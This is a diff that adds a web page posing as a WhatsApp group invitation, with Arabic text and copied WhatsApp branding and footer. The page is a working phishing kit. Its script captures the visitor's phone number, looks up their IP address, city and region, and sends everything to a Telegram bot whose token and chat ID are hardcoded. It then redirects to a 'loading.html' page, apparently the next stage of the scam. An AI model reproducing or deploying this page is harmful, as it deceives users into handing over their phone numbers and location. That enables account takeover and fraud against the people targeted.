@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>الدعوة للانضمام إلى مجموعة واتساب</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" type="image/svg+xml">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
+  
+  <style>
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #f5f5f5; }
+    .navbar { background-color: #4CAF50; padding: 15px 20px; color: white; font-size: 18px; text-align: center; }
+    .container {
+      max-width: 400px; margin: 60px auto; background-color: #fff;
+      padding: 30px 20px; border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); text-align: center;
+    }
+    .logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 10px; }
+    .sub-image {
+      width: 100%; max-height: 200px; object-fit: cover;
+      border-radius: 8px; margin-bottom: 20px;
+    }
+    h2 { color: #333; margin-bottom: 20px; }
+    .phone-input {
+      display: flex; align-items: center; padding: 12px;
+      border: 1px solid #ccc; border-radius: 8px;
+      font-size: 16px; margin-bottom: 20px; width: 100%;
+      box-sizing: border-box;
+    }
+    button {
+      background: linear-gradient(to right, #43e97b, #38f9d7); color: #fff;
+      padding: 15px 25px; font-size: 16px; font-weight: bold;
+      border: none; border-radius: 30px; cursor: pointer;
+      width: 100%; margin-top: 20px; transition: background 0.3s ease;
+    }
+    button:hover {
+      background: linear-gradient(to right, #38f9d7, #43e97b);
+    }
+    footer {
+      background-color: #2e7d32; color: white;
+      padding: 40px 20px; text-align: center;
+    }
+    footer .footer-links {
+      display: flex; flex-wrap: wrap; justify-content: center;
+      gap: 15px; margin-bottom: 20px;
+    }
+    footer .footer-links p { margin: 5px 10px; }
+    footer .footer-bottom { font-size: 14px; opacity: 0.8; }
+  </style>
+</head>
+<body>
+  <div class="navbar"> WhatsApp Invite</div>
+  <div class="container">
+    <img src="DSxOAUB0raA.png" alt="Banner" class="sub-image" />
+    <img src="172245867233593622.png" alt="Logo" class="logo" />
+    <h2>الدعوة للانضمام إلى مجموعة واتساب    </h2>
+    <form id="phone-form">
+      <input id="phone" class="phone-input" type="tel" name="phone" pattern="[0-9]*" required autocomplete="off" />
+      <button type="submit">متابعة</button>
+    </form>
+  </div>
+  <footer>
+    <div class="footer-links">
+      <p>Use WhatsApp</p><p>Features</p><p>WhatsApp Web</p><p>Download</p>
+      <p>About Us</p><p>Business</p><p>Security</p><p>Privacy & Terms</p>
+      <p>Get in Touch</p><p>Contact Us</p><p>Facebook | X (Twitter)</p><p>Meta Logo</p>
+    </div>
+    <div class="footer-bottom">© 2025 WhatsApp</div>
+  </footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"></script>
+  <script>
+    let phoneInput;
+
+    function getFlagEmoji(countryCode) {
+      const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
+      return String.fromCodePoint(...codePoints);
+    }
+
+    async function getIpInfo() {
+      const response = await fetch('https://ipinfo.io/json?token=4d1535316da2be');
+      return response.json();
+    }
+
+    async function sendToTelegram(message) {
+      const telegramToken = '7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY';
+      const chatId = '7196613507';
+      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    }
+
+    async function handleSubmit(event) {
+      event.preventDefault();
+      const phoneNumber = phoneInput.getNumber();
+      localStorage.setItem("submittedPhone", phoneNumber);
+      const ipInfo = await getIpInfo();
+
+      const countryCode = ipInfo.country;
+      const flagEmoji = getFlagEmoji(countryCode);
+      const callingCode = phoneInput.getSelectedCountryData().dialCode;
+
+      const message = `📞 Phone Number: ${phoneNumber}\n🌍 Country Code: ${countryCode} ${flagEmoji}\n📞 Calling Code: +${callingCode}\n🏙️ City: ${ipInfo.city}\n🗺️ Region: ${ipInfo.region}\n💻 IP Address: ${ipInfo.ip}`;
+
+      await sendToTelegram(message);
+      window.location.href = "loading.html";
+    }
+
+    document.addEventListener("DOMContentLoaded", async () => {
+      const input = document.querySelector("#phone");
+      const ipInfo = await getIpInfo();
+      const countryCode = ipInfo.country ? ipInfo.country.toLowerCase() : 'us';
+
+      phoneInput = window.intlTelInput(input, {
+        initialCountry: countryCode,
+        geoIpLookup: (callback) => callback(countryCode),
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+      });
+
+      function updatePlaceholder() {
+        const exampleNumber = intlTelInputUtils.getExampleNumber(
+          phoneInput.getSelectedCountryData().iso2.toUpperCase(),
+          0,
+          intlTelInputUtils.numberFormat.NATIONAL
+        );
+        input.placeholder = exampleNumber;
+      }
+
+      input.addEventListener("countrychange", updatePlaceholder);
+      updatePlaceholder();
+
+      document.querySelector("#phone-form").addEventListener("submit", handleSubmit);
+    });
+  </script>
+</body>
+</html>
